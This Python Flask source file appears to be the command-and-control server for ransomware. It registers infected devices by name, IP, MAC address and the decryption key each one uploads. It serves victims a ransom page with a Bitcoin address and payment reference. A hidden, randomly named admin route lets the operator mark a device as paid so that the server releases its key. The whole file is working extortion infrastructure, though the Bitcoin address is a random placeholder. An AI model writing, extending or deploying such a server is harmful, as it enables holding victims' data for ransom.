from flask import Flask, render_template, request, jsonify, redirect
from random import sample
from string import ascii_letters
from flask_sqlalchemy import SQLAlchemy
from datetime import datetime


app = Flask(__name__)
app.config['SQLALCHEMY_DATABASE_URI'] = 'sqlite:///devices.db'

db = SQLAlchemy(app)

ADMIN_PAGE = ''.join(sample(ascii_letters, 10))
BITCOIN_ADDRESS = ''.join(sample(ascii_letters, 10))

print("[+] ADMIN ROUTE:", ADMIN_PAGE)

class Device(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    name = db.Column(db.String(255), nullable=False)
    ip = db.Column(db.String(255), nullable=False)
    mac = db.Column(db.String(255), nullable=False)
    last_ping = db.Column(db.DateTime, nullable=False, default=datetime.now)
    decryption_key = db.Column(db.String(1000), nullable=False)
    is_decrypted = db.Column(db.Boolean, nullable=False, default=False)
    payment_ref = db.Column(db.String(255), nullable=False, default= lambda: ''.join(sample(ascii_letters, 10)))

@app.route('/<payment_ref>')
def index(payment_ref):
    return render_template('victim_page.html', address=BITCOIN_ADDRESS, payment_ref=payment_ref)

@app.get(f'/{ADMIN_PAGE}')
def admin():
    devices = Device.query.all()
    return render_template('admin_page.html', devices=devices)

@app.get(f'/{ADMIN_PAGE}/set_decrypted/<payment_ref>')
def set_decrypted(payment_ref):
    device = Device.query.filter_by(payment_ref=payment_ref).first()
    device.is_decrypted = True
    db.session.commit()
    return redirect(f'/{ADMIN_PAGE}')

@app.post('/initial_ping')
def initial_ping():
    device = Device(
            name=request.json['name'],
            ip=request.json['ip'],
            mac=request.json['mac'],
            decryption_key=request.json['decryption_key'],
        )
    db.session.add(device)
    db.session.commit()
    return jsonify({'status': 'success', 'payment_ref': device.payment_ref})

@app.get('/ping')
def ping():
    try:
        device = Device.query.filter_by(ip=request.json['ip']).first()
        device.last_ping = datetime.now()
        db.session.commit()
        if device.is_decrypted:
            return jsonify({'status': 'success', 'decryption_key': device.decryption_key, 'is_decrypted': device.is_decrypted, 'mac': device.mac})
        else:
            return jsonify({'status': 'success', 'decryption_key': None, 'is_decrypted': device.is_decrypted, 'mac': device.mac})
    except Exception:
        return jsonify({'status': 'error'})


if __name__ == '__main__':
    app.run(debug=True)